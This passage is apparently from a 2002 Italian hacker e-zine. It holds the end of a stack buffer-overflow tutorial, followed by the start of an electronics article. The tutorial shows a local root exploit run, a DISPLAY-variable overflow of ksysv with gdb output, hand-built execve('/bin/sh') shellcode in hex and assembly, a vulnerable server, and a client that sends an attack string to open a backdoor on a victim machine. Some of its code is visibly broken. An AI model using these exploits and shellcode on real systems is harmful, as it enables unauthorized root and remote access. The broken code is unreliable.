|                                                                          |
| ------------------------8<--CUT HERE--8<-------------------------------  |
| -                                                                        |
|                                                                          |
|                                                                          |
| Ora non ci resta che avere (20% di culo per indovinare l'offset,anche    |
| se siamo aiutati dai nops e saremo root :)                               |
|                                                                          |
| [e4m@twotux e4m]$ ./exploit xxx 2                                        |
|                                                                          |
| Stack pointer:0xbfbffb90                                                 |
|       Offset: 0x0                                                        |
| Return addr: 0xbfbffb90                                                  |
|                                                                          |
| [e4m@twotux e4m]#  <-- root missione completata :)                       |
|                                                                          |
| ======================================================================   |
|                                                                          |
|                                                                          |
| ShellCoding (..proviamo??!)                                              |
| >>>>>>>>>>>>>>>>>>>>>>>>>>>                                              |
|                                                                          |
| Makke' missione completata..!!!!                                         |
| Non siamo neppure a meta' del bello ;) Vedremo ora come exploitare       |
| ksysv (un programma che serve a gestire il boot di linux).               |
| L'errore consiste nello scrivere nella variabile d'ambiente DISPLAY,     |
| il RET ADDRESS, che verrα utilizzato per puntare ad un codice scritto    |
| in assembly, che esegue /bin/sh. Sfruttando l'environment "DISPLAY"      |
| owerflovandola riceveremo i permessi..                                   |
|                                                                          |
| Questo e' l'errore,vengono inseriti dati nel buffer senza                |
| controllare se questi possono entrarvi correttamente visto               |
| che e' di soli 16bytes:                                                  |
|                                                                          |
| void ovf(char *str) {                                                    |
|    char buffer[16];                                                      |
|    strcpy(buffer,str);  /                                                |
|    * arr.. scellerato avrebbe detto il mio prof!:PP*/                    |
|   }                                                                      |
| void main() {                                                            |
|   char rotfl[256];                                                       |
|   int i;                                                                 |
|   /* rempiamo di "a" la variabile rotfl */                               |
|   for( i = 0; i < 255; i++) rotfl[i] = 'A';                              |
|   ovf(rotfl); }                                                          |
|                                                                          |
|                                                                          |
| Basta guardare qui:                                                      |
|                                                                          |
| [e4m@twotux /root]# export DISPLAY=`/usr/bin/perl -e 'print "A" x        |
| 3000'`                                                                   |
| (commento; invia attraverso il cmd perl circa 3000 A all'environment)    |
|                                                                          |
| Questo "test" Φ utile per vedere quanto pu≥ essere pericoloso un certo   |
| programma (logicamente si va a tentativi per quanto riguarda il Copy )   |
| Attivate la vostra mente Al max potete fare un programma tipo questo     |
| che vi illustro. Just FOr Fun;  DOVREBBE!! funzionare!                   |
|                                                                          |
| ------------------------8<--CUT HERE--8<-------------------------------  |
|                                                                          |
|                                                                          |
| #include &lt;errno.h>                                                       |
| #include &lt;stdio.h>                                                       |
| #include &lt;stdlib.h>                                                      |
|                                                                          |
| int main(){                                                              |
|                                                                          |
| FILE *vul; /*pointer a vuln*/                                            |
|                                                                          |
|   int i; /* puntatore di ciclo */                                        |
|                                                                          |
|   printf("\n\nInserisci il file a cui testare la vulnerabilitα:\n");     |
|   printf("compresa la patch del file: "); /* una volta inserito..*/      |
|                                                                          |
|   scanf("%s", vul);                                                      |
|                                                                          |
|   printf("Scansiono: %s \n", vul);                                       |
|   printf("\nTale processo potrebbe richiedere qualche secondo...\n");    |
|                                                                          |
|   fopen("vul","+a"); /*apre il file con opzione +a*/                     |
|                                                                          |
|   /*a=modifica senza toccarlo */                                         |
|                                                                          |
|      for(i = 1; i <= 10000; i++){                                        |
| /* ciclo : ripete fino a 100 volte ...*/                                 |
|                                                                          |
|       fprintf(vul,"A");                                                  |
| /*questa funzione ossia scrive nel file "A"*/                            |
|  }                                                                       |
|                                                                          |
|  /* una volta finito se da SegFault potrebbe essere vulnerabile...*/     |
|                                                                          |
|  if (i==10000) /*..altrimenti....*/                                      |
|                                                                          |
|  fclose(vul); /*chiudo*/                                                 |
|  printf("Operazione non riuscita :(\n"); /* nada..!*/                    |
|                                                                          |
|  return(0);                                                              |
|                                                                          |
| }                                                                        |
|                                                                          |
|                                                                          |
| ------------------------8<--CUT HERE--8<-------------------------------  |
| -                                                                        |
|                                                                          |
| [e4m@twotux /root]# gdb /usr/bin/ksysv                                   |
|                                                                          |
| GNU gdb Red Hat Linux (5.1.90CVS-5)                                      |
| Copyright 2002 Free Software Foundation, Inc.                            |
| GDB is free software, covered by the GNU                                 |
| General Public License, and you are                                      |
| welcome to change it and/or distribute                                   |
| copies of it under certain conditions.                                   |
| Type "show copying" to see the conditions.                               |
| There is absolutely no warranty for GDB.                                 |
| Type "show warranty" for details.                                        |
| This GDB was configured as "i386-redhat-linux"...                        |
|                                                                          |
| (gdb) run                                                                |
|                                                                          |
| Starting program: /usr/bin/ksysv                                         |
|                                                                          |
| warning: Unable to find dynamic linker breakpoint function.              |
| GDB will be unable to debug shared library                               |
| initializers and track explicitly loaded dynamic code.                   |
| warning: shared library handler failed to enable                         |
| breakpoint Debug: Qt: gdb: -nograb added to command-line options.        |
| Use the -dograb option to enforce grabbing.                              |
|                                                                          |
| Warning: ksysv: cannot connect to X server                               |
| AAAAAAAAAAAA...                                                          |
| (qui compariranno 3000 A)                                                |
|                                                                          |
| Program received signal SIGSEGV, Segmentation fault.                     |
| (commento : hahahahha :)                                                 |
|                                                                          |
| 0x41414141 in ?? ()                                                      |
|                                                                          |
| (gdb) info register eip                                                  |
|                                                                          |
| (commento; Con "info register eip" vediamo che il                        |
| registro EIP (Istruction Pointer), e' stato sovrascritto con             |
| 0x41414141, che non sono altro che 4 A (AAAA),                           |
| ossia le A che abbiamo inserito nella variabile d'ambiente e             |
| che hanno sovrascritto EIP. (dopo avere exploitato))                     |
|                                                                          |
| eip            0x41414141       1094795585                               |
|                                                                          |
| (gdb) quit                                                               |
| The program is running.  Exit anyway? (y or n) y                         |
|                                                                          |
|                                                                          |
| [e4m@twotux /root]#                                                      |
|                                                                          |
| Iniziamo con lo scrivere una bella shellcode ..                          |
| ma come diavolo si fa?? Come sappiamo dovrebe aprirci una shell ,        |
| incominciamo a farne una in c:                                           |
|                                                                          |
| #include &lt;stdio.h>                                                       |
| #include &lt;unistd.h>                                                      |
|                                                                          |
| void                                                                     |
| shell()                                                                  |
| {                                                                        |
|   char prog[]="sh";                                                      |
|   char *arg[]={};                                                        |
|                                                                          |
|   execl("/bin/sh","",NULL);                                              |
|                                                                          |
| }                                                                        |
|                                                                          |
|                                                                          |
| int                                                                      |
| main()                                                                   |
| {                                                                        |
|   shell();                                                               |
|   return 0;                                                              |
| }                                                                        |
|                                                                          |
| Compiliamo:                                                              |
|                                                                          |
| -static e' il flag che fa al caso nostro, la command line per            |
| compilare e' quindi:                                                     |
|                                                                          |
| # gcc main.c -o main -static                                             |
| ... se ora facciamo                                                      |
|                                                                          |
| # objdump -d main | less                                                 |
|                                                                          |
| arriviamo a questo punto che dumpa il sorgente statico grazie al         |
| nostro amico less e con un po' di pasienza....                           |
|                                                                          |
| ====================================================================     |
|                                                                          |
|                                                                          |
| Avanzate Di Dumping                                                      |
| >>>>>>>>>>>>>>>>>>>                                                      |
|                                                                          |
| 0804818c &lt;shell>:                                                        |
|  804818c: 55 pushl %ebp                                                  |
|  804818d: 89 e5 movl %esp,%ebp                                           |
|  804818f: 83 ec 04 subl $0x4,%esp                                        |
|  8048192: 8d 45 fc leal 0xfffffffc(%ebp),%eax                            |
|  8048195: 66 8b 15 08 e0 06 08 movw 0x806e008,%dx                        |
|  804819c: 66 89 55 fc movw %dx,0xfffffffc(%ebp)                          |
|  80481a0: 8a 05 0a e0 06 08 movb 0x806e00a,%al                           |
|  80481a6: 88 45 fe movb %al,0xfffffffe(%ebp)                             |
|  80481a9: 8d 45 fc leal 0xfffffffc(%ebp),%eax                            |
|  80481ac: 6a 00 pushl $0x0                                               |
|  80481ae: 68 0b e0 06 08 pushl $0x806e00b                                |
|  80481b3: 68 0c e0 06 08 pushl $0x806e00c                                |
|  80481b8: e8 6f 43 00 00 call 804c52c &lt;execl>  <----- OKKIO!             |
|  80481bd: 83 c4 0c addl $0xc,%esp                                        |
|  80481c0: c9 leave                                                       |
|  80481c1: c3 ret                                                         |
|                                                                          |
| si nota bene il call 804c52c &lt;execl>, preceduto dal pushl                |
| dei paramentri, 3 come ci aspettavamo. andiamo a vedere execl...         |
| (In pratica a poco a poco ci avviciniamo al "core")                      |
|                                                                          |
| 0804c52c &lt;execl>:                                                        |
|  804c52c: 55 pushl %ebp                                                  |
|  804c52d: 89 e5 movl %esp,%ebp                                           |
|  804c52f: 57 pushl %edi                                                  |
|  804c530: 56 pushl %esi                                                  |
|  804c531: 53 pushl %ebx                                                  |
|  804c532: 8b 45 0c movl 0xc(%ebp),%eax                                   |
|  804c535: be 00 04 00 00 movl $0x400,%esi                                |
|  804c53a: 81 c4 00 f0 ff ff addl $0xfffff000,%esp                        |
|  804c540: 89 e2 movl %esp,%edx                                           |
|  804c542: 89 04 24 movl %eax,(%esp,1)                                    |
|  804c545: 8d 7d 10 leal 0x10(%ebp),%edi                                  |
|  804c548: bb 01 00 00 00 movl $0x1,%ebx                                  |
|  804c54d: 85 c0 testl %eax,%eax                                          |
|  804c54f: 74 4e je 804c59f &lt;execl+0x73>                                  |
|  804c551: 8d 76 00 leal 0x0(%esi),%esi                                   |
|  804c554: 39 f3 cmpl %esi,%ebx                                           |
|  804c556: 75 35 jne 804c58d &lt;execl+0x61>                                 |
|  804c558: 8d 34 5d 00 00 00 00 leal 0x0(,%ebx,2),%esi                    |
|  804c55f: 8d 04 b5 00 00 00 00 leal 0x0(,%esi,4),%eax                    |
|  804c566: 29 c4 subl %eax,%esp                                           |
|  804c568: 89 e1 movl %esp,%ecx                                           |
|  804c56a: 8d 04 34 leal (%esp,%esi,1),%eax                               |
|  804c56d: 39 d0 cmpl %edx,%eax                                           |
|  804c56f: 75 0f jne 804c580 &lt;execl+0x54>                                 |
|  804c571: 53 pushl %ebx                                                  |
|  804c572: 52 pushl %edx                                                  |
|  804c573: 51 pushl %ecx                                                  |
|  804c574: e8 57 ff ff ff call 804c4d0 &lt;memcpy>                           |
|  804c579: 89 c2 movl %eax,%edx                                           |
|  804c57b: 01 de addl %ebx,%esi                                           |
|  804c57d: eb 0b jmp 804c58a &lt;execl+0x5e>                                 |
|  804c57f: 90 nop                                                         |
|  804c580: 53 pushl %ebx                                                  |
|  804c581: 52 pushl %edx                                                  |
|  804c582: 51 pushl %ecx                                                  |
|  804c583: e8 48 ff ff ff call 804c4d0 &lt;memcpy>                           |
|  804c588: 89 c2 movl %eax,%edx                                           |
|  804c58a: 83 c4 0c addl $0xc,%esp                                        |
|  804c58d: 83 c7 04 addl $0x4,%edi                                        |
|  804c590: 8b 47 fc movl 0xfffffffc(%edi),%eax                            |
|  804c593: 89 04 9a movl %eax,(%edx,%ebx,4)                               |
|  804c596: 89 d8 movl %ebx,%eax                                           |
|  804c598: 43 incl %ebx                                                   |
|  804c599: 83 3c 82 00 cmpl $0x0,(%edx,%eax,4)                            |
|  804c59d: 75 b5 jne 804c554 &lt;execl+0x28>                                 |
|  804c59f: ff 35 68 6e 07 08 pushl 0x8076e68                              |
|  804c5a5: 52 pushl %edx                                                  |
|  804c5a6: ff 75 08 pushl 0x8(%ebp)                                       |
|  804c5a9: e8 d6 1c 00 00 call 804e284 <__execve>                         |
|  804c5ae: 8d 65 f4 leal 0xfffffff4(%ebp),%esp                            |
|  804c5b1: 5b popl %ebx                                                   |
|  804c5b2: 5e popl %esi                                                   |
|  804c5b3: 5f popl %edi                                                   |
|  804c5b4: c9 leave                                                       |
|  804c5b5: c3 ret                                                         |
|                                                                          |
|                                                                          |
| Lasciamo tutti gli altri, prendiamo solo :                               |
| "804c5a9: e8 d6 1c 00 00 call 804e284 <__execve>"                        |
| che risulta importante:                                                  |
|                                                                          |
| 0804e284 <__execve>:                                                     |
|  804e284: 55 pushl %ebp                                                  |
|  804e285: 89 e5 movl %esp,%ebp                                           |
|  804e287: 57 pushl %edi                                                  |
|  804e288: 53 pushl %ebx                                                  |
|  804e289: 8b 7d 08 movl 0x8(%ebp),%edi                                   |
|  804e28c: b8 00 00 00 00 movl $0x0,%eax                                  |
|  804e291: 85 c0 testl %eax,%eax                                          |
|  804e293: 74 05 je 804e29a <__execve+0x16>                               |
|  804e295: e8 66 1d fb f7 call 0 <_init-0x80480b4>                        |
|  804e29a: 8b 4d 0c movl 0xc(%ebp),%ecx                                   |
|  804e29d: 8b 55 10 movl 0x10(%ebp),%edx                                  |
|  804e2a0: 53 pushl %ebx                                                  |
|  804e2a1: 89 fb movl %edi,%ebx                                           |
|  804e2a3: b8 0b 00 00 00 movl $0xb,%eax                                  |
|  804e2a8: cd 80 int $0x80                                                |
|  804e2aa: 5b popl %ebx                                                   |
|  804e2ab: 89 c3 movl %eax,%ebx                                           |
|  804e2ad: 81 fb 00 f0 ff ff cmpl $0xfffff000,%ebx                        |
|  804e2b3: 76 0e jbe 804e2c3 <__execve+0x3f>                              |
|  804e2b5: e8 16 a0 ff ff call 80482d0 <__errno_location>                 |
|  804e2ba: f7 db negl %ebx                                                |
|  804e2bc: 89 18 movl %ebx,(%eax)                                         |
|  804e2be: bb ff ff ff ff movl $0xffffffff,%ebx                           |
|  804e2c3: 89 d8 movl %ebx,%eax                                           |
|  804e2c5: 8d 65 f8 leal 0xfffffff8(%ebp),%esp                            |
|  804e2c8: 5b popl %ebx                                                   |
|  804e2c9: 5f popl %edi                                                   |
|  804e2ca: c9 leave                                                       |
|  804e2cb: c3 ret                                                         |
|                                                                          |
| Ole' abbiamo quasi fatto!! --> int $0x80 ci interessa. per capire        |
| questo int $0x80 bisogna dire che: sotto unix l' interfaccia             |
| con il kernel non Φ mascherata tramite delle api ma tramite una          |
| system call, che a basso livello sotto linux-i386 viene posta sul        |
| software interrupt 0x80. execve fa esattamente questo: chiama la         |
| syscall, quindi l' int 0x80.. il numero della syscall viene passato      |
| su %eax, quindi                                                          |
|                                                                          |
| #define __NR_execve 11  fa al caso nostro. Nel codice era:               |
|                                                                          |
| 804e2a3: b8 0b 00 00 00 movl $0xb,%eax                                   |
|                                                                          |
| il che mette in luce un problema non trascurabile.                       |
| In c (linguaggio con cui Φ scritta la roba che volete overfloware)       |
| il char 0 indica la fine di una stringa, quindi non possiamo certo       |
| permetterci una stringa con dentro b8 0b 00 00 00...                     |
| per ovviare ci≥ cleariamo %eax e ne settiamo solo il byte inferiore      |
| via:                                                                     |
|                                                                          |
| xorl %eax, %eax                                                          |
| movb $0x0b, %al                                                          |
| dove ovviamente il 0x0b e' l' esadecimale per l'11 della system call.    |
| Proseguendo nell' analisi della syscall si pu≥ notare che i parametri    |
| all' int vengono passati nella maniera usuale, ossia via registri e      |
| non tramite stack. a questo punto semplifichiamo un po' le cose e        |
| chiamiamo direttamente execve:                                           |
|                                                                          |
| #include &lt;unistd.h>                                                      |
|                                                                          |
| void                                                                     |
| shell()                                                                  |
| {                                                                        |
|   char prog[]="/bin/sh";                                                 |
|   char *env[]={"",NULL,};                                                |
|   execve(prog,arg,arg); /* etc voilα ..*/                                |
| }                                                                        |
|                                                                          |
| int                                                                      |
| main()                                                                   |
| {                                                                        |
|   shell();                                                               |
|   return 0;                                                              |
| }                                                                        |
|                                                                          |
|                                                                          |
| # gcc -static main.c -o main                                             |
| # objdump -d main                                                        |
| e la nostra shell() e' diventata:                                        |
|                                                                          |
| 0804818c &lt;shell>:                                                        |
|  804818c: 55 pushl %ebp                                                  |
|  804818d: 89 e5 movl %esp,%ebp                                           |
|  804818f: 83 ec 18 subl $0x18,%esp                                       |
|  8048192: 8d 45 f8 leal 0xfffffff8(%ebp),%eax                            |
|  8048195: 8b 15 a8 df 06 08 movl 0x806dfa8,%edx                          |
|  804819b: 8b 0d ac df 06 08 movl 0x806dfac,%ecx                          |
|  80481a1: 89 55 f8 movl %edx,0xfffffff8(%ebp)                            |
|  80481a4: 89 4d fc movl %ecx,0xfffffffc(%ebp)                            |
|  80481a7: 8d 45 f0 leal 0xfffffff0(%ebp),%eax                            |
|  80481aa: c7 45 f0 b0 df 06 08 movl $0x806dfb0,0xfffffff0(%ebp)          |
|  80481b1: c7 45 f4 00 00 00 00 movl $0x0,0xfffffff4(%ebp)                |
|  80481b8: 8d 45 e8 leal 0xffffffe8(%ebp),%eax                            |
|  80481bb: c7 45 e8 b0 df 06 08 movl $0x806dfb0,0xffffffe8(%ebp)          |
|  80481c2: c7 45 ec 00 00 00 00 movl $0x0,0xffffffec(%ebp)                |
|  80481c9: 8d 45 f0 leal 0xfffffff0(%ebp),%eax                            |
|  80481cc: 50 pushl %eax                                                  |
|  80481cd: 8d 45 f0 leal 0xfffffff0(%ebp),%eax                            |
|  80481d0: 50 pushl %eax                                                  |
|  80481d1: 8d 45 f8 leal 0xfffffff8(%ebp),%eax                            |
|  80481d4: 50 pushl %eax                                                  |
|  80481d5: e8 72 43 00 00 call 804c54c >__execve>                         |
|  80481da: 83 c4 0c addl $0xc,%esp                                        |
|  80481dd: c9 leave                                                       |
|  80481de: c3 ret                                                         |
|                                                                          |
| Qui e' un casino, infatti non ci ho capito un cavolo :P                  |
|                                                                          |
| Un'altra cosa: non possiamo usare puntatori cross sections per           |
| i nostri dati visto che verra messo tutto sullo stack ;                  |
|                                                                          |
| Ci faro' quindi comodo sapere il puntatore ad una zona nota              |
| di memoria dello shellcode, a questo punto facciamo una cosa             |
| del tipo:                                                                |
|                                                                          |
| main:                                                                    |
| jmp dumb                                                                 |
|                                                                          |
| sh:                                                                      |
| popl %esi                                                                |
| ...                                                                      |
|                                                                          |
| dumb:                                                                    |
| call sh                                                                  |
|                                                                          |
| visto che e' ben noto che la call pusha il valore del punto di ritorno   |
| (il seguente %eip) sul frame precedente allo stack della funzione.       |
| Se quindi noi facciamo in modo che dopo ci sia la "/bin/sh" siamo a      |
| posto, il che tra le altre cose ci va bene poichΦ termina la stringa     |
| e fine dei problemi. In sostanza diventerebbe una cosa del tipo:         |
|                                                                          |
| main:                                                                    |
| jmp dumb                                                                 |
|                                                                          |
| sh:                                                                      |
| popl %esi                                                                |
| xorl %eax,%eax                                                           |
| movb %al, 0x7(%esi)                                                      |
| movl %esi, 0x8(%esi)                                                     |
| movl %eax, 0xc(%esi)                                                     |
|                                                                          |
| movl %esi, %ebx                                                          |
| leal 0x8(%esi), %ecx                                                     |
| leal 0xc(%esi), %edx                                                     |
| movb $0x0b, %al                                                          |
|                                                                          |
| int $0x80                                                                |
|                                                                          |
| xorl %eax,%eax                                                           |
| incl %eax                                                                |
| int $0x80                                                                |
|                                                                          |
| dumb:                                                                    |
| call sh                                                                  |
|                                                                          |
| Tutto pi∙ semplice non Φ vero? Ora basta disassemblarlo!                 |
|                                                                          |
|                                                                          |
| 00000000 &lt;main>:                                                         |
|   0: eb 1d jmp 1f &lt;dumb>                                                 |
|                                                                          |
| 00000002 &lt;sh>:                                                           |
|   2: 5e popl %esi                                                        |
|   3: 31 c0 xorl %eax,%eax                                                |
|   5: 88 46 07 movb %al,0x7(%esi)                                         |
|   8: 89 76 08 movl %esi,0x8(%esi)                                        |
|   b: 89 46 0c movl %eax,0xc(%esi)                                        |
|   e: 89 f3 movl %esi,%ebx                                                |
|   10: 8d 4e 08 leal 0x8(%esi),%ecx                                       |
|   13: 8d 56 0c leal 0xc(%esi),%edx                                       |
|   16: b0 0b movb $0xb,%al                                                |
|   18: cd 80 int $0x80                                                    |
|   1a: 31 c0 xorl %eax,%eax                                               |
|   1c: 40 incl %eax                                                       |
|   1d: cd 80 int $0x80                                                    |
|                                                                          |
|  0000001f &lt;dumb>:                                                        |
|   1f: e8 de ff ff ff call 2 &lt;sh>                                         |
|                                                                          |
| Ora lasciamo perdere il numrero del listato e prendiamo                  |
| l'OPCODE affianco al codice sorgente dumpato:                            |
| eb 5e 1d 5e 31 88 46 07 89 76 etc. etc......                             |
|                                                                          |
| char shcode[]="\xeb\x1d\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46      |
| \x0c"                                                                    |
| "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"   |
| "\xe8\xde\xff\xff\xff/bin/"                                              |
|                                                                          |
| Alleluja,abbiamo finito anche questo..! Ecco come un codice sorgente     |
| dopo essere dumpato egestito diventa  pericoloso come pu≥ essere uno     |
| shellcode con un p≥ di codice C applicato.                               |
|                                                                          |
| Qui vi dico subito che io ho SPUDORATEMANTE COPIATO lo shellcode         |
| IN ASM da aleph1 che Φ un dio del buffer overflow e a fare il processo   |
| ci ha pensato prima lui..                                                |
|                                                                          |
| ======================================================================   |
|                                                                          |
| Exploiting Remote                                                        |
| >>>>>>>>>>>>>>>>>                                                        |
|                                                                          |
| Ora ci tocca iniziare a scrivere il mini exploit >:)                     |
| Qui ci sono da dire alcune cose impotanti:                               |
|                                                                          |
| Date un okkio a questo programma che sara' il target:                    |
|                                                                          |
|                                                                          |
| ------------------------8<--CUT                                          |
| HERE--8<------------------------------                                   |
|                                                                          |
|                                                                          |
|                                                                          |
| unsigned long get_sp(void) {                                             |
|    __asm__("movl %esp,%eax");                                            |
| }                                                                        |
|                                                                          |
| void leggi (char *buff,int connfd){                                      |
|                                                                          |
|                                                                          |
|  char vuln[512];                                                         |
|  int n,len,offset=0,tot=0;                                               |
|                                                                          |
|                                                                          |
|                                                                          |
|   while(n=read(connfd,&buff[tot],MAXLINE)>0){                            |
|        tot+=n;                                                           |
|   }                                                                      |
|                                                                          |
|   strcpy(vuln,buff);/* AUTO DISTRUZIONE :P!*/                            |
|   strcat(vuln,", hello!\n");                                             |
|   write(connfd, vuln, strlen(vuln)+1);                                   |
| }                                                                        |
|                                                                          |
|                                                                          |
|                                                                          |
| int                                                                      |
| main(void)                                                               |
| {                                                                        |
|         int                     listenfd, connfd;                        |
|         struct sockaddr_in      servaddr;                                |
|         char                    buff[MAXLINE];                           |
|         time_t                  ticks;                                   |
|         long                    addr;                                    |
|         const int               on=1;                                    |
|          int *ret;                                                       |
|                                                                          |
|                                                                          |
|                                                                          |
|          addr =get_sp();                                                 |
|                                                                          |
|                                                                          |
|         if ( (listenfd = socket(AF_INET, SOCK_STREAM, 0)) <0){           |
|                 perror("opening socket");                                |
|                 exit(1);                                                 |
|         }                                                                |
|                                                                          |
|         bzero(&servaddr, sizeof(servaddr));                              |
|         servaddr.sin_family      = AF_INET;                              |
|         servaddr.sin_addr.s_addr = htonl(INADDR_ANY);                    |
|         servaddr.sin_port        = htons(PORT);                          |
| if(setsockopt(listenfd,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(on))){         |
|          printf("errore setsockopt\n");                                  |
|          exit(-1);                                                       |
|                                                                          |
|         }                                                                |
|                                                                          |
| if(bind(listenfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0)  |
| {                                                                        |
|                 perror("Error in binding :(");                           |
|                 exit(1);                                                 |
|         }                                                                |
|                                                                          |
|         listen(listenfd, 5);                                             |
|                                                                          |
|         for ( ; ; ) {                                                    |
| connfd = accept(listenfd, (struct sockaddr *) NULL, NULL);               |
|                                                                          |
|                 leggi(buff,connfd); /*legge il buffer */                 |
|                                                                          |
|                 close(connfd);                                           |
|         }                                                                |
| }                                                                        |
|                                                                          |
| ------------------------8<--CUT HERE--8<-------------------------------  |
| -                                                                        |
|                                                                          |
| E se a questo punto volessimo hakkare questo programma                   |
| tramite un client strutturato come l'exploit locale?                     |
| Facile invieremo l'environment al server tramite remote...               |
| hehhe bell'idea! Questo codice l'ho trovato navigando e                  |
| fa al caso nostro ho fatto solo qualche commento per rendere             |
| il tutto pi∙ chiaro:                                                     |
|                                                                          |
| ------------------------8<--CUT HERE--8<-------------------------------  |
| -                                                                        |
|                                                                          |
|                                                                          |
| #include &lt;netinet/in.h>                                                  |
| #include &lt;stdio.h>                                                       |
| #include &lt;errno.h>                                                       |
| #include &lt;netdb.h>                                                       |
|                                                                          |
| int                                                                      |
| main(int argc, char **argv)                                              |
| {                                                                        |
|         int                     sockfd, n;                               |
|         char                    arguments[MAXLINE ];                     |
|         char                    recvline[MAXLINE ];                      |
|         struct sockaddr_in      servaddr;                                |
|         struct hostent            *hp;                                   |
|                                                                          |
|    if (argc != 3){ /* sev non Φ specificato ti d≥ la suintassi!*/        |
| fprintf(stderr,"usage: %s &lt;IPaddress> &lt;a> :EGG=%s\n", argv[0], argv      |
| [2]);                                                                    |
|    exit (1);                                                             |
|         }                                                                |
|                                                                          |
|         if((hp=gethostbyname(argv[1]))==NULL){ /* connetto! */           |
| fprintf(stderr, "host ERROR for %s: %s", argv[1], hstrerror(h_errno));   |
| /* on error...*/                                                         |
|  }                                                                       |
|                                                                          |
|         if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){            |
|                 perror("socket error :(");                               |
|                 exit (1);                                                |
|         }                                                                |
|                                                                          |
|                                                                          |
|         bzero(&servaddr, sizeof(servaddr));                              |
|         servaddr.sin_family = AF_INET;                                   |
|         servaddr.sin_port   = htons(PORT);                               |
| /*qui ci interessa..*/                                                   |
|  memcpy(&servaddr.sin_addr, hp->h_addr_list[0], sizeof(struct            |
| in_addr));                                                               |
|        /*copia la memoria e la invia al sock ..*/                        |
|                                                                          |
|        /* na volta connesso.. */                                         |
| if (connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr))     |
| < 0)                                                                     |
| {                                                                        |
|                 perror("connect error :( ");                             |
| /* se non si e' riusciti ad inviare da errore!*/                         |
|                 exit (1);                                                |
|         }                                                                |
|                                                                          |
|           /*creo l'UOVO!!*/                                              |
|         sprintf(arguments,"%s",argv[2]);                                 |
|         write (sockfd, arguments, strlen(arguments) + 1);                |
|         shutdown(sockfd,SHUT_WR);                                        |
|                                                                          |
|         while ( (n = read(sockfd, recvline, MAXLINE)) > 0) {             |
|                 recvline[n] = 0;                                         |
|                 if (fputs(recvline, stdout) == EOF){                     |
|                         perror("fputs error");                           |
|                         exit (1);                                        |
|                 }                                                        |
|         }                                                                |
|         exit(0);                                                         |
| }     exit(0);                                                           |
| }                                                                        |
|                                                                          |
| ------------------------8<--CUT HERE--8<-------------------------------  |
| -                                                                        |
|                                                                          |
| Eseguendo prima l'exploit con offset=6500 e buffersize=612,              |
| creiamo una variabile d'ambiente EGG.                                    |
| Con il comando helloclient &lt;IPADDRESS> $EGG inviamo al server            |
| la stringa d'attacco che ci apre una backdoor sulla macchina vittima.    |
| A questo punto con semplice applicazione C riusciamo a connetterci       |
| alla macchina su cui risiede il server attraverso la backdoor creata.    |
| I privilegi di cui ci avvaliamo sono quelli assegnati al server          |
| ...Dhehihihohu.. cosa credevate,gli exploit remoti fungono cosi'...      |
| Da bravi LAMERI!!                                                        |
|                                                                          |
| Riporto una magnifica tabella scritta da "aleph1", re dello smashing     |
| dello stack :) ..Qui vi sono "tutte" le architetture,e le shellcode:     |
|                                                                          |
| ( per BSD la trovate scritta s∙ nel programma principale!)               |
|                                                                          |
| Linux i386:                                                              |
|                                                                          |
|         jmp    0x1f                                                      |
|         popl   %esi                                                      |
|         movl   %esi,0x8(%esi)                                            |
|         xorl   %eax,%eax                                                 |
| movb   %eax,0x7(%esi)                                                    |
|         movl   %eax,0xc(%esi)                                            |
|         movb   $0xb,%al                                                  |
|         movl   %esi,%ebx                                                 |
|         leal   0x8(%esi),%ecx                                            |
|         leal   0xc(%esi),%edx                                            |
|         int    $0x80                                                     |
|         xorl   %ebx,%ebx                                                 |
|         movl   %ebx,%eax                                                 |
|         inc    %eax                                                      |
|         int    $0x80                                                     |
|         call   -0x24                                                     |
|         .string \"/bin/sh\"                                              |
|                                                                          |
|                                                                          |
| SPARC/Solaris: (dedicated to Sempronio ;P)                               |
|                                                                          |
|         sethi   0xbd89a, %l6                                             |
|         or      %l6, 0x16e, %l6                                          |
|         sethi   0xbdcda, %l7                                             |
|         and     %sp, %sp, %o0                                            |
|         add     %sp, 8, %o1                                              |
|         xor     %o2, %o2, %o2                                            |
|         add     %sp, 16, %sp                                             |
|         std     %l6, [%sp - 16]                                          |
|         st      %sp, [%sp - 8]                                           |
|         st      %g0, [%sp - 4]                                           |
|         mov     0x3b, %g1                                                |
|         ta      8                                                        |
|         xor     %o7, %o7, %o0                                            |
|         mov     1, %g1                                                   |
|         ta      8                                                        |
|                                                                          |
|                                                                          |
|                                                                          |
| ================================================================         |
|                                                                          |
| Greetz & Conclusion                                                      |
|  >>>>>>>>>>>>>>>>>>>                                                     |
|                                                                          |
|  Wella' il tute finisce qui, spero di essere stato esaudiente..          |
|  con queste infinite righe :)                                            |
|  Ricordate di utilizzare sempre la mente e non fermatevi mai..!          |
|  Bye bye , altre due righe per salutare due amici.                       |
|                                                                          |
|  Saluto tutto lo staff di TwoTux.org & _Slash_ , Gioker84                |
|  [Evil] che mi ha dato spunto per riprendere il tute. Inth3Dark          |
|  che mi ha passato un algoritmo , se tutto andrα nei migliori            |
|  dei modi lo risolveremo presto :P , ancora BbOyIce ehhe...!             |
|  Shapeless che sta lavorando sodo per la versione del portale            |
|  twotux.org nuovo, se non lo sta facendo lo picchio (ancora              |
|  thx!) Skramer , Vinci chΦ ha problemi all'apparato genitale             |
|  :PP Spero che il progetto slackit (dot) org vada avanti alla            |
|  grande, saluto gli amici di #slackware , ancora Elektro e               |
|  Max . GLi amici di OndaQuadra ! , UIHA e gli amici di IRC.              |
|  Se non ci sei , scusami e sentiti incluso :)                            |
|                                                                          |
|  mail @ e4m@autistici.org                                                |
|  www  @ www.twotux.org irc                                               |
|  @ irc.azzurra.org                                                       |
|                                                                          |
|  ".. Gnu is not unix .."                                                 |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ MiSC                                       #08 - 01/11/2002 |
| DiGiTAL                                              [evilcry] 0x11/0x1A |
+--------------------------------------------------------------------------+
| ******[Cenni di elettronica digitale applicata ad un computer]******     |
|                                                                          |
|                                                                          |
|                                                                          |
| ****************************                                             |
| Autore:Evilcry             *                                             |
| E-Mail:evilcry@virgilio.it *                                             |
| ****************************                                             |
|                                                                          |
| DISCLAIMER: Non mi ritengo assolutamente responsabile di eventuali danni | 
